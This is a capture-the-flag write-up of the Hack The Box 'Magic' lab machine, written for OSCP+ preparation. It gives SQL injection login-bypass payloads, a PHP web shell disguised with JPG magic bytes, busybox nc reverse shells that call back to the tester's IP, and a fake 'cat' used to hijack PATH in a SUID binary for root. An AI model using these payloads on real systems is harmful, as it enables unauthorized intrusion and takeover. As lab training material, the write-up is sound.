---
layout: post
title:  HTB Magic Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-11 05:00:00 +0300
image:  '/images/htb_magic.png'
tags:   [Write-ups, HTB, OSCP+, Linux, Medium, SQL-Injection-Bypass, File-Upload-Bypass, Magic-Bytes, PHP-Reverse-Shell, BusyBox, MySQL, Port-Forwarding, Credentials-in-DB-File, SUID, Relative-Path-Exploitation]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
  - [SQL Injection Bypass on the login portal](#sql-injection-bypass-on-the-login-portal)
- [Foothold](#foothold)
  - [Bypassing File Upload restrictions adding JPG Magic Bytes to our PHP shell](#bypassing-file-upload-restrictions-adding-jpg-magic-bytes-to-our-php-shell)
  - [Finding /images/uploads directory and interacting with PHP shell to get access using busybox nc](#finding-imagesuploads-directory-and-interacting-with-php-shell-to-get-access-using-busybox-nc)
  - [Finding MySQL credentials in db.php5 file](#finding-mysql-credentials-in-dbphp5-file)
  - [Forwarding Port 3306 to access MySQL](#forwarding-port-3306-to-access-mysql)
  - [Accessing and enumerating MySQL database to find credentials](#accessing-and-enumerating-mysql-database-to-find-credentials)
  - [Using su and the password we found to get shell as theseus](#using-su-and-the-password-we-found-to-get-shell-as-theseus)
- [Privilege Escalation](#privilege-escalation)
  - [Finding sysinfo with SETUID bit set using cat binary without absolute path](#finding-sysinfo-with-setuid-bit-set-using-cat-binary-without-absolute-path)
  - [Changing PATH variable and creating malicious cat binary containing a busybox reverse shell](#changing-path-variable-and-creating-malicious-cat-binary-containing-a-busybox-reverse-shell)

# Enumeration
### Nmap
```shell
# Step 1 - Find active ports
sudo nmap -p- -Pn --min-rate 10000 10.129.140.54

# Step 2 - Focus scan on the active ports found
sudo nmap -A -T4 -Pn -p22,80 10.129.140.54
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 21:22 EST
Nmap scan report for 10.129.140.54
Host is up (0.033s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   33.91 ms 10.10.14.1
2   33.98 ms 10.129.140.54

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.05 seconds
```

We found port 22 open, which would allow us SSH access if we had credentials, and port 80, which is a website.

### Web Enumeration
Lets start enumerating the website:

```shell
http://10.129.140.54/
```

When accessing the website, we see many images with apparently random names.

On the bottom of the website we can see "Please Login, to upload images" and a login link. It seems if we get access we will be able to upload files, meaning we could maybe upload a reverse shell.

When clicking on login, we get to the following URL:

```shell
http://10.129.140.54/login.php
```

We tried some default credentials but werent successful.

Lets try some SQL injections.

### SQL Injection Bypass on the login portal
We tried our luck with the following basic SQL injection bypass payloads entering them as username with any password:

```shell
admin'--
' OR 1=1-- -
'' OR 1=1-- -
admin'--
admin' or 1=1-- -
admin' or 1=1-- -
admin'or'1'='1
admin' or '1'='1
```

One of the payloads allowed us to get access (It works with and without spaces):

```shell
admin'or'1'='1
admin' or '1'='1
```

One SQL Injection Auth Bypass list I really like is:

https://gist.github.com/spenkk/2cd2f7eeb9cac92dd550855e522c558f

# Foothold
### Bypassing File Upload restrictions adding JPG Magic Bytes to our PHP shell
If we try to upload anything that is not JPG, JPEG or PNG, we will get the following message:

```shell
Sorry, only JPG, JPEG and PNG files are allowed.
```

If we just try to change the shell extension like this:

```shell
cp shell.php shell.php.jpg
```

We will still get an error message when trying to upload it.

It seems like its using the magic bytes of the files to recognize if they are jpg, jpeg, png or anything else.

Searching on Google we found the Magic Bytes for JPG files:

```shell
FF D8 FF EE
```

Lets create a PHP shell and then add the Magic Bytes for JPG.

First create the PHP shell like this:

```shell
echo '....' > shell.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.jpg
```

Entering 4 points we kept our PHP shell intact while adding the lenght we will change for the JPG Magic Bytes:

```shell
.... = 2E 2E 2E 2E
```

Another way to create the file:

```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg
echo -e "....\n$(cat shell.php.jpg)" > shell.php.jpg
```

We can now open the file with hexeditor and change the first 4 characters (1 character = 2 Hex like 2E) to the ones we need as Magic Bytes:

```shell
hexeditor shell.php.jpg
```

And now change the first part:

```shell
# First part before change
2E 2E 2E 2E

# First part after changing it for the Magic Bytes
FF D8 FF EE

# Save the edited file with Ctrl+X
```

Lets try to upload our PHP shell now.

Nice! We got the following message:

```shell
The file shell.php.jpg has been uploaded. 
```

### Finding /images/uploads directory and interacting with PHP shell to get access using busybox nc
Now we can try to guess the path to our uploaded file. I found it to be:

```shell
http://10.129.140.54/images/uploads/shell.php.jpg
```

But we can use Feroxbuster to find it out instead of guessing using the following command:

```shell
feroxbuster -u http://10.129.140.54 -r
```

```shell
http://10.129.140.54/images/uploads/trx.jpg
```

Knowing the location of our PHP shell, we can start a nc listener on Kali and interact with our PHP shell through URL to get a reverse shell:

```shell
nc -lvnp 8443
```

```shell
http://10.129.140.54/images/uploads/shell.php.jpg?cmd=id
```

The command id worked.

We werent lucky using normal bash and nc reverse shells, so lets use busybox (revshells.com and URL encoded):

```
http://10.129.140.54/images/uploads/shell.php.jpg?cmd=busybox%20nc%2010.10.14.206%208443%20-e%20%2Fbin%2Fsh
```

It worked! We got a response on our nc listener:

```shell
listening on [any] 8443 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.140.54] 52556
whoami
www-data
```

Lets upgrade our shell:

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Finding MySQL credentials in db.php5 file
After doing some enumeration, we found the credentials of the user theseus inside the db.php5 file:

```shell
cat db.php5

<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
<SNIP>
```

Unfortunately, these credentials dont work on SSH.

### Forwarding Port 3306 to access MySQL
If we try to access MySQL locally, we will find out that its not installed:

```shell
mysql -h localhost -u theseus -piamkingtheseus
```

```shell
Command 'mysql' not found, but can be installed with:

apt install mysql-client-core-5.7   
apt install mariadb-client-core-10.1

Ask your administrator to install one of them.
```

We will need to forward the port 3306 and access from our Kali.

We can use ligolo-ng for that:

```shell
# Move agent file to the target first
# On Kali
cp /tools/agent .
python3 -m http.server 8080

# On target CLI
cd /tmp
wget http://10.10.14.206:8080/agent

# Start ligolo-ng on Kali
proxy -selfcert

# Start agent on the target
chmod +x agent
./agent -connect 10.10.14.206:11601 --ignore-cert

# Create an interface
sudo ip tuntap add user Vorkharium mode tun ligolo
sudo ip link set ligolo up

# Add internal route
sudo ip route add 240.0.0.1 dev ligolo

# Start session on ligolo-ng session
[Agent : www-data@magic] » session
? Specify a session : 1 - #1 - www-data@magic - 10.129.140.54:45140
[Agent : www-data@magic] » start
[Agent : www-data@magic] » INFO[0268] Starting tunnel to www-data@magic
```

Now we can test access with nmap:

```shell
# Check target with nmap
nmap -p- -Pn --min-rate 10000 240.0.0.1 -v

# It works, we got the following results
Nmap scan report for 240.0.0.1
Host is up (0.098s latency).
Not shown: 65452 filtered tcp ports (no-response), 80 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

### Accessing and enumerating MySQL database to find credentials

Now we can try accessing MySQL from Kali:

```shell
mysql -h 240.0.0.1 -u theseus -piamkingtheseus
```

It worked! We got access.

Lets enumerate the database and tables:

```shell
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Magic              |
+--------------------+
2 rows in set (0.033 sec)

MySQL [(none)]> use Magic;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [Magic]> show tables;
+-----------------+
| Tables_in_Magic |
+-----------------+
| login           |
+-----------------+
1 row in set (0.035 sec)

MySQL [Magic]> select * from login;
+----+----------+----------------+
| id | username | password       |
+----+----------+----------------+
|  1 | admin    | Th3s3usW4sK1ng |
+----+----------+----------------+
1 row in set (0.042 sec)
```

Nice! We found the admin credentials:

```shell
admin:Th3s3usW4sK1ng
```

### Using su and the password we found to get shell as theseus

The password seems to say Theseus Was King. Maybe this is the password for the user Theseus?

 Lets try changing to the user theseus using this password:
 
```shell
www-data@magic:/var/www/Magic/images/uploads$ su theseus
su theseus
Password: Th3s3usW4sK1ng

theseus@magic:/var/www/Magic/images/uploads$ 
```

Great! We were able to successfully change user to theseus.

### User Flag

```shell
cat /home/theseus/user.txt
```

# Privilege Escalation
### Finding sysinfo with SETUID bit set using cat binary without absolute path
We tried using sudo -l but the user theseus wasnt able to run sudo -l:

```shell
theseus@magic:/var/www/Magic/images/uploads$ sudo -l
sudo -l
[sudo] password for theseus: Th3s3usW4sK1ng
Sorry, user theseus may not run sudo on magic.
```

Enumerating SUIDs inside /bin we found something interesting:

```shell
find /bin -perm -4000 -type f 2>/dev/null

/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
/bin/su
/bin/ping
```

The sysinfo binary is not a default binary, maybe it does something interesting. We can run it as follow:

```shell
/bin/sysinfo
/bin/sysinfo -h
/bin/sysinfo --help
```

It seems like we cant get much information just by running it or using help parameter.

Lets examine the binary using strings:

```shell
strings /bin/sysinfo

<SNIP>
[]A\A]A^A_
popen() failed!
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
free -h
;*3$"
zPLR
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
<SNIP>
```

Looking at the CPU Info section we can see that its running cat without absolute path:

```shell
# With absolute path
/bin/cat /proc/cpuinfo

# Without absolute path
cat /proc/cpuinfo
```

We can abuse this putting a reverse shell on the path of the cat binary.

Lets check the PATH variable:

```shell
echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

```

Here we can see that the first path that the system will search is /usr/bin/local. If the executable is not there, it will search in the next directory.

Here is the order of search on the system from 1 (most priority) to 4 (least priority), this means the system starts searching at 1. directories and goes on, until it reaches the 4. directories:

```shell
1. /usr/local/sbin and /usr/local/bin
2. /usr/sbin and /usr/bin
3. /sbin and /bin
4. /usr/games and /usr/local/games
```

### Changing PATH variable and creating malicious cat binary containing a busybox reverse shell
Lets change the PATH variable so the system starts searching at our directory:

```shell
# Make theseus directory the first directory to be searched on the PATH variable
cd ~
PATH=.:${PATH}
export PATH

# Examine if we successfully changed the PATH variable
echo $PATH

# Here we can see we successfully added "." as first directory
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Lets now create a malicious cat file containing a reverse shell:

```shell
echo 'busybox nc 10.10.14.206 9001 -e bash' > cat
chmod +x cat
```

Check the contents of the fake cat with the real /bin/cat:

```shell
theseus@magic:~$ /bin/cat cat
/bin/cat cat
busybox nc 10.10.14.206 9001 -e bash
```

We are good to go!

Now start our nc listener on Kali and run the /bin/sysinfo binary from the theseus directory:

```shell
nc -lvnp 9001
```

```shell
theseus@magic:~$ /bin/sysinfo
```

After running the /bin/sysinfo binary, we will get a response on our nc listener, giving us a shell as root:

```shell
listening on [any] 9001 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.140.54] 56148
whoami
root
```

### Root Flag
Now we can get the root.txt flag:

```shell
cat /root/root.txt
```

